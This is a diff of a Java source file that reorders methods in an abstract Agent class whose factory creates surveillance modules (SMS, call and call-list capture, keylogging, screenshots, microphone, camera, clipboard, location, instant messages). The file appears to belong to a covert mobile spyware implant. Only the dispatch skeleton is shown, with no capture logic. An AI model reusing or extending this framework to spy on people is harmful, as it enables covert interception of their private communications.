@@ -38,81 +38,78 @@ public abstract class Agent extends Thread {
     public static final int AGENT_APPLICATION = AGENT + 0x11;
     public static final int AGENT_PDA = 0xDF7A;
 
+    public static Agent Factory(int AgentId, int AgentStatus, byte[] confParams) {
+        switch (AgentId) {
+        case AGENT_SMS:
+            debug.trace("Factory AGENT_SMS");
+            return new SmsAgent(AgentStatus, confParams);
+        case AGENT_TASK:
+            debug.trace("Factory AGENT_TASK");
+            return new TaskAgent(AgentStatus, confParams);
+        case AGENT_CALLLIST:
+            debug.trace("Factory AGENT_DEVICE");
+            return new CallListAgent(AgentStatus, confParams);
+        case AGENT_DEVICE:
+            debug.trace("Factory AGENT_DEVICE");
+            return new DeviceInfoAgent(AgentStatus, confParams);
+        case AGENT_POSITION:
+            debug.trace("Factory AGENT_POSITION");
+            return new PositionAgent(AgentStatus, confParams);
+        case AGENT_CALL:
+            debug.trace("Factory AGENT_CALL");
+            return new CallAgent(AgentStatus, confParams);
+        case AGENT_CALL_LOCAL:
+            debug.trace("Factory AGENT_CALL_LOCAL");
+            return new CallLocalAgent(AgentStatus, confParams);
+        case AGENT_KEYLOG:
+            debug.trace("Factory AGENT_KEYLOG");
+            return new KeyLogAgent(AgentStatus, confParams);
+        case AGENT_SNAPSHOT:
+            debug.trace("Factory AGENT_SNAPSHOT");
+            return new SnapShotAgent(AgentStatus, confParams);
+        case AGENT_URL:
+            debug.trace("Factory AGENT_URL");
+            return new UrlAgent(AgentStatus, confParams);
+        case AGENT_IM:
+            debug.trace("Factory AGENT_IM");
+            return new ImAgent(AgentStatus, confParams);
+        case AGENT_MIC:
+            debug.trace("Factory AGENT_MIC");
+            return new MicAgent(AgentStatus, confParams);
+        case AGENT_CAM:
+            debug.trace("Factory AGENT_CAM");
+            return new CamAgent(AgentStatus, confParams);
+        case AGENT_CLIPBOARD:
+            debug.trace("Factory AGENT_CLIPBOARD");
+            return new ClipBoardAgent(AgentStatus, confParams);
+        case AGENT_CRISIS:
+            debug.trace("Factory AGENT_CRISIS");
+            return new CrisisAgent(AgentStatus, confParams);
+        case AGENT_APPLICATION:
+            debug.trace("Factory AGENT_APPLICATION");
+            return new ApplicationAgent(AgentStatus, confParams);
+        case AGENT_PDA:
+            debug.trace("Factory AGENT_PDA");
+            return new PdaAgent(AgentStatus, confParams);
+
+        default:
+            debug.trace("AgentId UNKNOWN: " + AgentId);
+            return null;
+        }
+    }
+
     Status status;
+
     LogCollector logCollector;
 
     boolean logOnSD;
-
     public int AgentId;
+
     public int AgentStatus;
 
     public int Command;
 
     protected Log log;
-
-    public static Agent Factory(int AgentId, int AgentStatus, byte[] confParams) {
-        switch (AgentId) {
-            case AGENT_SMS:
-                debug.trace("Factory AGENT_SMS");
-                return new SmsAgent(AgentStatus, confParams);
-            case AGENT_TASK:
-                debug.trace("Factory AGENT_TASK");
-                return new TaskAgent(AgentStatus, confParams);
-            case AGENT_CALLLIST:
-                debug.trace("Factory AGENT_DEVICE");
-                return new CallListAgent(AgentStatus, confParams);
-            case AGENT_DEVICE:
-                debug.trace("Factory AGENT_DEVICE");
-                return new DeviceInfoAgent(AgentStatus, confParams);
-            case AGENT_POSITION:
-                debug.trace("Factory AGENT_POSITION");
-                return new PositionAgent(AgentStatus, confParams);
-            case AGENT_CALL:
-                debug.trace("Factory AGENT_CALL");
-                return new CallAgent(AgentStatus, confParams);
-            case AGENT_CALL_LOCAL:
-                debug.trace("Factory AGENT_CALL_LOCAL");
-                return new CallLocalAgent(AgentStatus, confParams);
-            case AGENT_KEYLOG:
-                debug.trace("Factory AGENT_KEYLOG");
-                return new KeyLogAgent(AgentStatus, confParams);
-            case AGENT_SNAPSHOT:
-                debug.trace("Factory AGENT_SNAPSHOT");
-                return new SnapShotAgent(AgentStatus, confParams);
-            case AGENT_URL:
-                debug.trace("Factory AGENT_URL");
-                return new UrlAgent(AgentStatus, confParams);
-            case AGENT_IM:
-                debug.trace("Factory AGENT_IM");
-                return new ImAgent(AgentStatus, confParams);
-            case AGENT_MIC:
-                debug.trace("Factory AGENT_MIC");
-                return new MicAgent(AgentStatus, confParams);
-            case AGENT_CAM:
-                debug.trace("Factory AGENT_CAM");
-                return new CamAgent(AgentStatus, confParams);
-            case AGENT_CLIPBOARD:
-                debug.trace("Factory AGENT_CLIPBOARD");
-                return new ClipBoardAgent(AgentStatus, confParams);
-            case AGENT_CRISIS:
-                debug.trace("Factory AGENT_CRISIS");
-                return new CrisisAgent(AgentStatus, confParams);
-            case AGENT_APPLICATION:
-                debug.trace("Factory AGENT_APPLICATION");
-                return new ApplicationAgent(AgentStatus, confParams);
-            case AGENT_PDA:
-                debug.trace("Factory AGENT_PDA");
-                return new PdaAgent(AgentStatus, confParams);
-
-            default:
-                debug.trace("AgentId UNKNOWN: " + AgentId);
-                return null;
-        }
-    }
-
-    public boolean onSD() {
-        return logOnSD;
-    }
 
     protected Agent(int AgentId, int AgentStatus, boolean logOnSD) {
         status = Status.getInstance();
@@ -125,7 +122,7 @@ public abstract class Agent extends Thread {
         this.log = logCollector.LogFactory(this, logOnSD);
     }
 
-    protected abstract boolean Parse(byte[] confParameters);
+    public abstract void AgentRun();
 
     protected boolean AgentSleep(int millisec) {
         int loops = 0;
@@ -155,15 +152,11 @@ public abstract class Agent extends Thread {
         return false;
     }
 
-    protected boolean SleepUntilStopped() {
-        for (;;) {
-            if (AgentSleep(10 * 1000)) {
-                status.ThreadAgentStopped(AgentId);
-                debug.trace("Agent.java - CleanStop " + AgentId);
-                return true;
-            }
-        }
+    public boolean onSD() {
+        return logOnSD;
     }
+
+    protected abstract boolean Parse(byte[] confParameters);
 
     public void run() {
         if (log == null) {
@@ -176,7 +169,15 @@ public abstract class Agent extends Thread {
         status.ThreadAgentStopped(AgentId);
     }
 
-    public abstract void AgentRun();
+    protected boolean SleepUntilStopped() {
+        for (;;) {
+            if (AgentSleep(10 * 1000)) {
+                status.ThreadAgentStopped(AgentId);
+                debug.trace("Agent.java - CleanStop " + AgentId);
+                return true;
+            }
+        }
+    }
 
     public String toString() {
         return "Agent " + AgentId;
